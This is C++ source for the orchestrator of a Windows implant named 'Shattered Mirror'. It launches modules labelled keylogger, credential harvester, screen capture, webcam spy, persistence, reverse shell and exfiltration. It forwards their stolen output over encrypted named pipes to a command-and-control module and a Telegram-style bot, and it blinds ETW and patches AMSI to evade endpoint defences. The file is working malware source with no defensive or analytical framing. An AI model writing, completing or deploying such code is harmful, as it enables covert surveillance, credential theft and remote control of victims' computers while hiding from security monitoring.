/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: Atom Manager Core
 * OPTION B: Orchestrator hosts both command and report pipe servers.
 * FULLY FIXED: Dual pipes, immediate command send, report forwarding.
 *===========================================================================*/

#include "AtomManager.h"
#ifdef ATOM_1_ENABLED
#include "../Atoms/Atom_01_Net.h"
#endif
#ifdef ATOM_2_ENABLED
#include "../Atoms/Atom_02_Key.h"
#endif
#ifdef ATOM_3_ENABLED
#include "../Atoms/Atom_03_Sys.h"
#endif
#ifdef ATOM_4_ENABLED
#include "../Atoms/Atom_04_AMSI.h"
#endif
#ifdef ATOM_5_ENABLED
#include "../Atoms/Atom_05_Exfil.h"
#endif
#ifdef ATOM_6_ENABLED
#include "../Atoms/Atom_06_Screen.h"
#endif
#ifdef ATOM_7_ENABLED
#include "../Atoms/Atom_07_Persist.h"
#endif
#ifdef ATOM_8_ENABLED
#include "../Atoms/Atom_08_Proc.h"
#endif
#ifdef ATOM_9_ENABLED
#include "../Atoms/Atom_09_FileSys.h"
#endif
#ifdef ATOM_10_ENABLED
#include "../Atoms/Atom_10_Shell.h"
#endif
#ifdef ATOM_11_ENABLED
#include "../Atoms/Atom_11_Ping.h"
#endif
#ifdef ATOM_12_ENABLED
#include "../Atoms/Atom_12_Bale.h"
#endif
#ifdef ATOM_13_ENABLED
#include "../Atoms/Atom_13_Creds.h"
#endif
#ifdef ATOM_14_ENABLED
#include "../Atoms/Atom_14_Spy.h"
#endif
#include <cstdio>
#include <string>
#include "../Evasion_Suite/include/etw_blind.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include "Config.h"
#include "Logger.h"
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

extern SYSCALL_TABLE g_SyscallTable;

static BYTE s_SessionKey[16] = {0};
DWORD WINAPI IpcListenerThread(LPVOID lpParam);

static ATOM_RECORD s_Atoms[MAX_ATOMS] = {0};
static CRITICAL_SECTION s_AtomCS;  // Thread safety for s_Atoms[] access

// Global handle to Atom 1's report pipe for forwarding non‑Bale reports
static HANDLE g_hNetworkReportPipe = NULL;
// Global handle to Bale Bot's report pipe for universal Telegram forwarding
static HANDLE g_hBaleReportPipe = NULL;
static CRITICAL_SECTION s_BaleReportCS;
static BOOL s_BaleCSInitialized = FALSE;

extern BOOL InstallAMSIBypass(void);
extern DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam);
extern DWORD WINAPI SpyCamAtomMain(LPVOID lpParam);

#define MAX_RESULT_QUEUE 128
static std::string s_ResultQueue[MAX_RESULT_QUEUE];
static int s_QueueCount = 0;

// --------------------------------------------------------------------------
// Debug trace for listener
// --------------------------------------------------------------------------
static void ListenerTrace(DWORD atomId, const char *format, ...) {
  if (!Config::LOGGING_ENABLED) return;
  char buf[512];
  va_list args;
  va_start(args, format);
  int len = vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  if (len > 0) {
    char full[600];
    sprintf_s(full, "[LSN %lu] %s\n", atomId, buf);
    OutputDebugStringA(full);
    FILE *f = fopen("log\\listener_debug.txt", "a");
    if (f) {
      fprintf(f, "[%lu] Atom %lu: %s\n", GetTickCount(), atomId, buf);
      fclose(f);
    }
  }
}

static void QueueResult(const std::string &result) {
  if (s_QueueCount < MAX_RESULT_QUEUE) {
    s_ResultQueue[s_QueueCount++] = result;
    Logger::Log(INFO, "Result queued. Depth: " + std::to_string(s_QueueCount));
  } else {
    Logger::Log(ERROR_LOG, "Result queue full.");
  }
}

static void Base64Encode(const BYTE *pBuf, DWORD dwLen, char *szOut) {
  if (!pBuf || !szOut)
    return;
  static const char cb64[] =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  int i, j;
  for (i = 0, j = 0; i < (int)dwLen; i += 3) {
    int v = pBuf[i];
    v = (v << 8) | (i + 1 < (int)dwLen ? pBuf[i + 1] : 0);
    v = (v << 8) | (i + 2 < (int)dwLen ? pBuf[i + 2] : 0);
    szOut[j++] = cb64[(v >> 18) & 0x3F];
    szOut[j++] = cb64[(v >> 12) & 0x3F];
    if (i + 1 < (int)dwLen)
      szOut[j++] = cb64[(v >> 6) & 0x3F];
    else
      szOut[j++] = '=';
    if (i + 2 < (int)dwLen)
      szOut[j++] = cb64[v & 0x3F];
    else
      szOut[j++] = '=';
  }
  szOut[j] = '\0';
}

BOOL SendHeartbeat() {
  if (g_hNetworkReportPipe && g_hNetworkReportPipe != INVALID_HANDLE_VALUE) {
    return TRUE;
  }
  return FALSE;
}

std::string FetchTask() { return ""; }

// --------------------------------------------------------------------------
// SendTaskResult: Forward reports to Atom 1 (Network) for exfiltration to C2
// --------------------------------------------------------------------------
void SendTaskResult(DWORD atomId, const BYTE* pPayload, DWORD dwPayloadLen, DWORD commandId = CMD_FORWARD_REPORT) {
    // 1. Universal Forwarding to Telegram (Bale Bot)
    if (g_hBaleReportPipe && g_hBaleReportPipe != INVALID_HANDLE_VALUE && atomId != 12) {
        if (!s_BaleCSInitialized) {
            InitializeCriticalSection(&s_BaleReportCS);
            s_BaleCSInitialized = TRUE;
        }

        EnterCriticalSection(&s_BaleReportCS);
        
        IPC_MESSAGE fwd = {0};
        fwd.dwSignature = 0x534D4952;
        fwd.CommandId = (ATOM_COMMAND_ID)commandId;
        fwd.AtomId = atomId;
        fwd.dwPayloadLen = (dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) ? MAX_IPC_PAYLOAD_SIZE : dwPayloadLen;
        memcpy(fwd.Payload, pPayload, fwd.dwPayloadLen);

        if (!IPC_SendMessage(g_hBaleReportPipe, &fwd, s_SessionKey, 16)) {
            ListenerTrace(atomId, "[TRAFFIC] Failed to forward to Bale (Telegram)");
            g_hBaleReportPipe = NULL;
        } else {
            ListenerTrace(atomId, "[TRAFFIC] Forwarded to Bale (Telegram)");
        }
        
        LeaveCriticalSection(&s_BaleReportCS);
    }

    // 2. Primary C2 Exfiltration (Network Atom -> Bouncer)
    if (g_hNetworkReportPipe && g_hNetworkReportPipe != INVALID_HANDLE_VALUE && atomId != 1) {
        IPC_MESSAGE fwd = {0};
        fwd.dwSignature = 0x534D4952;
        fwd.CommandId = (ATOM_COMMAND_ID)commandId;
        fwd.AtomId = atomId;
        fwd.dwPayloadLen = (dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) ? MAX_IPC_PAYLOAD_SIZE : dwPayloadLen;
        memcpy(fwd.Payload, pPayload, fwd.dwPayloadLen);

        if (!IPC_SendMessage(g_hNetworkReportPipe, &fwd, s_SessionKey, 16)) {
            Logger::Log(ERROR_LOG, "Failed to forward report to Atom 1");
            std::string resStr((char*)pPayload, dwPayloadLen);
            QueueResult(resStr);
        }
    } else if (atomId != 1) {
        // Only queue if not forwarded to Network and not coming from Network
        std::string resStr((char*)pPayload, dwPayloadLen);
        QueueResult(resStr);
    }
}

void FlushResultQueue() { /* ... */ }

// --------------------------------------------------------------------------
// QueueAtomCommand: Stores command and sends immediately via command pipe if
// atom is running.
// --------------------------------------------------------------------------
void QueueAtomCommand(DWORD atomId, const char *command, DWORD len) {
  if (atomId <= 0 || atomId > 14)
    return;
  if (len >= MAX_IPC_PAYLOAD_SIZE)
    len = MAX_IPC_PAYLOAD_SIZE - 1;

  EnterCriticalSection(&s_AtomCS);

  Logger::Log(INFO, "Queued command for Atom " + std::to_string(atomId) + ": " +
                        std::string(command, len));

  // Store as pending (fallback)
  memcpy(s_Atoms[atomId].pendingCommand, command, len);
  s_Atoms[atomId].pendingCommand[len] = '\0';
  s_Atoms[atomId].pendingCommandLen = len;

  // If atom is running and we have its command pipe, send immediately
  if (s_Atoms[atomId].Status == ATOM_STATUS_RUNNING &&
      s_Atoms[atomId].hCmdPipe) {
    ListenerTrace(atomId, "Sending immediate command via hCmdPipe (len=%lu)",
                  len);
    IPC_MESSAGE cmdMsg = {0};
    cmdMsg.dwSignature = 0x534D4952;
    cmdMsg.CommandId = CMD_EXECUTE;
    cmdMsg.dwPayloadLen = len;
    memcpy(cmdMsg.Payload, command, len);
    if (IPC_SendMessage(s_Atoms[atomId].hCmdPipe, &cmdMsg, s_SessionKey, 16)) {
      ListenerTrace(atomId, "Immediate command sent successfully");
      s_Atoms[atomId].pendingCommandLen = 0; // Clear pending since sent
    } else {
      ListenerTrace(atomId,
                    "Immediate command send failed, keeping in pending");
    }
  } else {
    ListenerTrace(atomId,
                  "Atom not running or no cmd pipe; command stored as pending");
  }

  LeaveCriticalSection(&s_AtomCS);
}

static BOOL SpawnAtomById(DWORD atom_id, const char *initialCommand = NULL,
                          DWORD cmdLen = 0, DWORD ownerId = 0) {
  if (atom_id <= 0 || atom_id > 14)
    return FALSE;
  if (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING) {
    Logger::Log(INFO, "Atom " + std::to_string(atom_id) + " already running.");
    if (initialCommand && cmdLen > 0) {
      QueueAtomCommand(atom_id, initialCommand, cmdLen);
    }
    return TRUE;
  }
  Logger::Log(SUCCESS,
              "Initiating ATOM " + std::to_string(atom_id) + " Deployment...");
  s_Atoms[atom_id].dwAtomId = atom_id;
  s_Atoms[atom_id].OwnerAtomId = ownerId;
  s_Atoms[atom_id].Status = ATOM_STATUS_STARTING;
  if (initialCommand && cmdLen > 0) {
    QueueAtomCommand(atom_id, initialCommand, cmdLen);
  }
  HANDLE hThread = NULL;
  switch (atom_id) {
#ifdef ATOM_1_ENABLED
  case 1:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NetworkAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_2_ENABLED
  case 2:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyloggerAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_3_ENABLED
  case 3:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SystemInfoAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_4_ENABLED
  case 4:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AMSIBypassAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_5_ENABLED
  case 5:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExfiltrationAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_6_ENABLED
  case 6:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScreenCaptureAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_7_ENABLED
  case 7:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PersistenceAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_8_ENABLED
  case 8:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ProcessAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_9_ENABLED
  case 9:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FileSystemAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_10_ENABLED
  case 10:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReverseShellAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_11_ENABLED
  case 11:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PingAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_12_ENABLED
  case 12:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BaleBotAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_13_ENABLED
  case 13:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CredentialHarvesterAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_14_ENABLED
  case 14:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SpyCamAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
  }
  if (hThread) {
    Logger::Log(INFO, "Telemetry bridge established for Atom " +
                          std::to_string(atom_id));
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IpcListenerThread,
                 (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    int timeout = 50;
    while (s_Atoms[atom_id].Status != ATOM_STATUS_RUNNING && timeout-- > 0)
      Sleep(100);
  }
  BOOL bResult = (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING);
  return bResult;
}

BOOL SpawnAtomFromTask(std::string json) { return TRUE; }

void StartAutoAtoms(void) {
  InitializeCriticalSection(&s_AtomCS);
  Logger::Log(INFO, "Starting auto‑run atoms...");
  for (int i = 0; i < Config::AUTO_START_COUNT; i++) {
    DWORD id = Config::AUTO_START_ATOMS[i];
    if (SpawnAtomById(id, NULL, 0, 0))
      Logger::Log(SUCCESS, "Auto‑started Atom " + std::to_string(id));
    else
      Logger::Log(ERROR_LOG, "Failed to auto‑start Atom " + std::to_string(id));
    Sleep(1500 + (rand() % 501)); // Random delay between 1.5s and 2.0s
  }
}

BOOL StopAtomById(DWORD atom_id) {
  if (atom_id <= 0 || atom_id > 14)
    return FALSE;
  if (s_Atoms[atom_id].Status != ATOM_STATUS_RUNNING) {
    Logger::Log(INFO, "Atom " + std::to_string(atom_id) + " is not running.");
    return FALSE;
  }
  Logger::Log(INFO, "Stopping Atom " + std::to_string(atom_id) + "...");
  
  // 1. Try graceful termination first
  if (s_Atoms[atom_id].hCmdPipe) {
    IPC_MESSAGE termMsg = {0};
    termMsg.dwSignature = 0x534D4952;
    termMsg.CommandId = CMD_TERMINATE;
    IPC_SendMessage(s_Atoms[atom_id].hCmdPipe, &termMsg, s_SessionKey, 16);
    CloseHandle(s_Atoms[atom_id].hCmdPipe);
    s_Atoms[atom_id].hCmdPipe = NULL;
  }

  // 2. Force terminate the process handle
  if (s_Atoms[atom_id].hProcess && s_Atoms[atom_id].hProcess != INVALID_HANDLE_VALUE) {
    TerminateProcess(s_Atoms[atom_id].hProcess, 0);
    CloseHandle(s_Atoms[atom_id].hProcess);
    s_Atoms[atom_id].hProcess = NULL;
  }

  if (s_Atoms[atom_id].hReportPipe) {
    CloseHandle(s_Atoms[atom_id].hReportPipe);
    s_Atoms[atom_id].hReportPipe = NULL;
  }

  s_Atoms[atom_id].Status = ATOM_STATUS_DEAD;
  if (atom_id == 1) g_hNetworkReportPipe = NULL;
  if (atom_id == 12) g_hBaleReportPipe = NULL;
  return TRUE;
}

void StopAllTasks() {
  Logger::Log(INFO, "ELITE FORCE STOP triggered. Purging all non-core tasks...");
  // Core atoms to keep (defined in Config::AUTO_START_ATOMS: 4, 12, 1)
  // We iterate through all possible atoms (1..14)
  for (DWORD id = 1; id < MAX_ATOMS; id++) {
    bool isCore = false;
    for (int j = 0; j < Config::AUTO_START_COUNT; j++) {
        if (id == Config::AUTO_START_ATOMS[j]) {
            isCore = true;
            break;
        }
    }
    // Also keep 7 (Persistence) if it's running, as it's critical
    if (id == 7) isCore = true;

    if (!isCore && s_Atoms[id].Status == ATOM_STATUS_RUNNING) {
        Logger::Log(INFO, "Purging Task Atom " + std::to_string(id) + "...");
        StopAtomById(id);
    }
  }
  Logger::Log(SUCCESS, "Implant tasking state reset to CORE ONLY.");
}

std::string ListRunningAtoms() {
  std::string list = "Running atoms:\n";
  for (int i = 1; i < MAX_ATOMS; i++)
    if (s_Atoms[i].Status == ATOM_STATUS_RUNNING)
      list += "Atom " + std::to_string(i) + "\n";
  return list;
}

// ===== LISTENER THREAD FOR DUAL PIPES (Option B) =====
DWORD WINAPI IpcListenerThread(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  ListenerTrace(dwAtomId, "Listener thread starting");

  // 1. Create report pipe server (receives reports from atom)
  HANDLE hReportPipe = IPC_CreateReportServerPipe(dwAtomId);
  if (!hReportPipe) {
    ListenerTrace(dwAtomId, "Failed to create report server pipe");
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    return 1;
  }

  // 2. Create command pipe server (sends commands to atom)
  HANDLE hCmdPipe = IPC_CreateCommandServerPipe(dwAtomId);
  if (!hCmdPipe) {
    ListenerTrace(dwAtomId, "Failed to create command server pipe");
    CloseHandle(hReportPipe);
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    return 1;
  }

  // Store handles
  s_Atoms[dwAtomId].hReportPipe = hReportPipe;
  s_Atoms[dwAtomId].hCmdPipe = hCmdPipe;
  ListenerTrace(dwAtomId, "[TRAFFIC] Pipe Listener OPENED & LISTENING");

  // Store Atom 1's report pipe for forwarding
  if (dwAtomId == 1) {
    g_hNetworkReportPipe = hReportPipe;
    ListenerTrace(dwAtomId, "Network report pipe handle stored");
  }
  // Store Bale Bot's report pipe for universal Telegram forwarding
  if (dwAtomId == 12) {
    g_hBaleReportPipe = hReportPipe;
    ListenerTrace(dwAtomId, "[TRAFFIC] Bale Bot established as Master Telemetry Bridge.");
  }

  // Wait for atom to connect to report pipe
  ListenerTrace(dwAtomId, "Waiting for atom to connect to report pipe %p",
                hReportPipe);
  if (!ConnectNamedPipe(hReportPipe, NULL) &&
      GetLastError() != ERROR_PIPE_CONNECTED) {
    ListenerTrace(dwAtomId, "ConnectNamedPipe(report) failed, error=%lu",
                  GetLastError());
    CloseHandle(hReportPipe);
    CloseHandle(hCmdPipe);
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    return 1;
  }
  ListenerTrace(dwAtomId, "Atom connected to report pipe");

  // Wait for atom to connect to command pipe
  ListenerTrace(dwAtomId, "Waiting for atom to connect to command pipe %p",
                hCmdPipe);
  if (!ConnectNamedPipe(hCmdPipe, NULL) &&
      GetLastError() != ERROR_PIPE_CONNECTED) {
    ListenerTrace(dwAtomId, "ConnectNamedPipe(cmd) failed, error=%lu",
                  GetLastError());
    CloseHandle(hReportPipe);
    CloseHandle(hCmdPipe);
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    return 1;
  }
  ListenerTrace(dwAtomId, "Atom connected to command pipe");

  s_Atoms[dwAtomId].Status = ATOM_STATUS_RUNNING;
  s_Atoms[dwAtomId].dwLastHeartbeat = GetTickCount();

  Logger::Log(SUCCESS,
              "IPC Bridges ONLINE for Atom " + std::to_string(dwAtomId) +
                  " | Report Pipe: " + std::to_string((ULONG_PTR)hReportPipe) +
                  " | Command Pipe: " + std::to_string((ULONG_PTR)hCmdPipe));

  // Main loop: read and process reports from hReportPipe
  while (TRUE) {
    EnterCriticalSection(&s_AtomCS);
    BOOL bActive = (s_Atoms[dwAtomId].Status == ATOM_STATUS_RUNNING);
    LeaveCriticalSection(&s_AtomCS);
    if (!bActive) break;

    DWORD dwAvail = 0;
    if (PeekNamedPipe(hReportPipe, NULL, 0, NULL, &dwAvail, NULL) &&
        dwAvail > 0) {
      IPC_MESSAGE msg = {0};
      if (IPC_ReceiveMessage(hReportPipe, &msg, s_SessionKey, 16)) {
        s_Atoms[dwAtomId].dwLastHeartbeat = GetTickCount();
        ListenerTrace(dwAtomId, "Received cmd=%d, payload=%lu on report pipe",
                      msg.CommandId, msg.dwPayloadLen);
        Logger::Log(INFO, "Received cmd=" + std::to_string(msg.CommandId) + " from Atom " + std::to_string(dwAtomId));

        // --- CMD_SPAWN_ATOM ---
        if (msg.CommandId == CMD_SPAWN_ATOM) {
          std::string payload((char *)msg.Payload, msg.dwPayloadLen);
          Logger::Log(INFO, "Received CMD_SPAWN_ATOM from Atom " + std::to_string(dwAtomId) + ": " + payload);
          
          size_t colonPos = payload.find(':');
          DWORD targetAtomId = 0;
          std::string args;
          if (colonPos != std::string::npos) {
            targetAtomId = (DWORD)std::stoul(payload.substr(0, colonPos));
            args = payload.substr(colonPos + 1);
          } else {
            targetAtomId = (DWORD)std::stoul(payload);
          }

          if (args == "STOP" || args == "TERMINATE") {
            StopAtomById(targetAtomId);
            IPC_MESSAGE ack = {0};
            ack.dwSignature = 0x534D4952;
            ack.CommandId = CMD_FORWARD_REPORT;
            ack.AtomId = targetAtomId;
            std::string ackPayload = "STOPPED:" + std::to_string(targetAtomId);
            ack.dwPayloadLen = (DWORD)ackPayload.length();
            memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
          }
          else if (args == "LIST") {
            std::string atomList = ListRunningAtoms();
            IPC_MESSAGE listMsg = {0};
            listMsg.dwSignature = 0x534D4952;
            listMsg.CommandId = CMD_FORWARD_REPORT;
            listMsg.AtomId = targetAtomId;
            listMsg.dwPayloadLen = (DWORD)atomList.length();
            if (listMsg.dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) listMsg.dwPayloadLen = MAX_IPC_PAYLOAD_SIZE;
            memcpy(listMsg.Payload, atomList.c_str(), listMsg.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &listMsg, s_SessionKey, 16);
          }
          else if (s_Atoms[targetAtomId].Status == ATOM_STATUS_RUNNING) {
            Logger::Log(INFO, "Atom " + std::to_string(targetAtomId) + " already running. Sending command.");
            s_Atoms[targetAtomId].bBaleRouted = TRUE;
            s_Atoms[targetAtomId].hBalePipe = hReportPipe;
            if (!args.empty()) {
              QueueAtomCommand(targetAtomId, args.c_str(), (DWORD)args.length());
            }
            IPC_MESSAGE ack = {0};
            ack.dwSignature = 0x534D4952;
            ack.CommandId = CMD_FORWARD_REPORT;
            ack.AtomId = targetAtomId;
            std::string ackPayload = "ACK:" + std::to_string(targetAtomId);
            ack.dwPayloadLen = (DWORD)ackPayload.length();
            memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
          }
          else {
            s_Atoms[targetAtomId].OwnerAtomId = dwAtomId;
            if (SpawnAtomById(targetAtomId, args.c_str(), (DWORD)args.length(), dwAtomId)) {
              IPC_MESSAGE ack = {0};
              ack.dwSignature = 0x534D4952;
              ack.CommandId = CMD_FORWARD_REPORT;
              ack.AtomId = targetAtomId;
              std::string ackPayload = "ACK:" + std::to_string(targetAtomId);
              ack.dwPayloadLen = (DWORD)ackPayload.length();
              memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
              IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
            } else {
              IPC_MESSAGE nack = {0};
              nack.dwSignature = 0x534D4952;
              nack.CommandId = CMD_FORWARD_REPORT;
              nack.AtomId = targetAtomId;
              std::string nackPayload = "NACK:" + std::to_string(targetAtomId);
              nack.dwPayloadLen = (DWORD)nackPayload.length();
              memcpy(nack.Payload, nackPayload.c_str(), nack.dwPayloadLen);
              IPC_SendMessage(hReportPipe, &nack, s_SessionKey, 16);
            }
          }
        }
        // --- CMD_READY ---
        else if (msg.CommandId == CMD_READY) {
          ListenerTrace(dwAtomId, "CMD_READY received");
          Logger::Log(INFO, "Received CMD_READY from Atom " + std::to_string(dwAtomId));
          if (s_Atoms[dwAtomId].pendingCommandLen > 0 && s_Atoms[dwAtomId].hCmdPipe) {
            ListenerTrace(dwAtomId, "Sending pending command on CMD_READY (len=%lu)", s_Atoms[dwAtomId].pendingCommandLen);
            IPC_MESSAGE cmdMsg = {0};
            cmdMsg.dwSignature = 0x534D4952;
            cmdMsg.CommandId = CMD_EXECUTE;
            cmdMsg.dwPayloadLen = s_Atoms[dwAtomId].pendingCommandLen;
            memcpy(cmdMsg.Payload, s_Atoms[dwAtomId].pendingCommand, cmdMsg.dwPayloadLen);
            if (IPC_SendMessage(s_Atoms[dwAtomId].hCmdPipe, &cmdMsg, s_SessionKey, 16)) {
              ListenerTrace(dwAtomId, "Pending command sent");
              s_Atoms[dwAtomId].pendingCommandLen = 0;
            }
          }
        }
        // --- CMD_REPORT ---
        else if (msg.CommandId == CMD_REPORT) {
          ListenerTrace(dwAtomId, "[TRAFFIC] REPORT received, size=%lu", msg.dwPayloadLen);
          SendTaskResult(dwAtomId, msg.Payload, msg.dwPayloadLen, CMD_FORWARD_REPORT);
        }
        // --- STOP ALL TASKS ---
        else if (msg.CommandId == CMD_STOP_ALL) {
           ListenerTrace(dwAtomId, "[TRAFFIC] Universal STOP received.");
           StopAllTasks();
        }
        // --- CMD_BALE_REPORT ---
        else if (msg.CommandId == CMD_BALE_REPORT) {
          ListenerTrace(dwAtomId, "[TRAFFIC] BALE_REPORT received, size=%lu", msg.dwPayloadLen);
          SendTaskResult(dwAtomId, msg.Payload, msg.dwPayloadLen, CMD_BALE_REPORT);

          IPC_MESSAGE ackMsg = {0};
          ackMsg.dwSignature = 0x534D4952;
          ackMsg.CommandId = CMD_REPORT_ACK;
          ackMsg.dwPayloadLen = 0;
          IPC_SendMessage(s_Atoms[dwAtomId].hCmdPipe, &ackMsg, s_SessionKey, 16);
        }
        // --- CMD_FORWARD_REPORT ---
        else if (msg.CommandId == CMD_FORWARD_REPORT) {
          ListenerTrace(dwAtomId, "[TRAFFIC] FORWARD_REPORT received, size=%lu", msg.dwPayloadLen);
          SendTaskResult(dwAtomId, msg.Payload, msg.dwPayloadLen, CMD_FORWARD_REPORT);
        }
        // --- UNKNOWN ---
        else {
          ListenerTrace(dwAtomId, "[TRAFFIC] Unknown command %d, ignoring", msg.CommandId);
        }
      } // end if IPC_ReceiveMessage
    } else {
      // PeekNamedPipe failed or no data. Check if pipe was severed.
      if (GetLastError() == ERROR_BROKEN_PIPE) {
          ListenerTrace(dwAtomId, "[TRAFFIC] Pipe broken during poll. Exiting.");
          break;
      }
    }
    Sleep(50);
  }

  ListenerTrace(dwAtomId, "[TRAFFIC] Pipe Listener CLOSED");
  Logger::Log(ERROR_LOG,
              "IPC Link SEVERED for Atom " + std::to_string(dwAtomId));
  s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
  CloseHandle(hReportPipe);
  CloseHandle(hCmdPipe);
  return 0;
}

BOOL InitAtomManager(void) {
  Logger::Log(INFO, "Initializing Orchestrator subsystems...");
  if (!Logger::Verify("Syscall Table Init", InitSyscallTable(&g_SyscallTable)))
    return FALSE;
#if defined(FEATURE_ETW_BLIND_ENABLED)
  if (Config::ENABLE_ETW_BLIND) {
    Logger::Log(INFO, "Blinding ETW...");
    BlindETW(&g_SyscallTable);
  }
#endif
#if defined(FEATURE_AMSI_BYPASS_ENABLED) && defined(FEATURE_VEH_HANDLER_ENABLED)
  if (Config::ENABLE_AMSI_BYPASS) {
    Logger::Log(INFO, "Patching AMSI...");
    InstallAMSIBypass();
  }
#endif
  memcpy(s_SessionKey, Config::PSK_ID, 16);
  for (int i = 0; i < MAX_ATOMS; i++) {
    s_Atoms[i].Status = ATOM_STATUS_UNINITIALIZED;
    s_Atoms[i].bBaleRouted = FALSE;
    s_Atoms[i].hBalePipe = NULL;
    s_Atoms[i].hReportPipe = NULL;
    s_Atoms[i].hCmdPipe = NULL;
    s_Atoms[i].OwnerAtomId = 0;
    s_Atoms[i].pendingCommandLen = 0;
    memset(s_Atoms[i].pendingCommand, 0, MAX_IPC_PAYLOAD_SIZE);
  }
  return TRUE;
}

DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
  Logger::Init(Config::LOG_FILE_PATH, Config::ENABLE_DEBUG_CONSOLE);
  Logger::Log(INFO, "--- SHATTERED MIRROR: ORCHESTRATOR ONLINE ---");
  if (!InitAtomManager()) {
    Logger::Shutdown();
    return 1;
  }
  SendHeartbeat();
  StartAutoAtoms();
  while (TRUE) {
    Sleep(2000);
    FlushResultQueue();
  }
  Logger::Shutdown();
  return 0;
}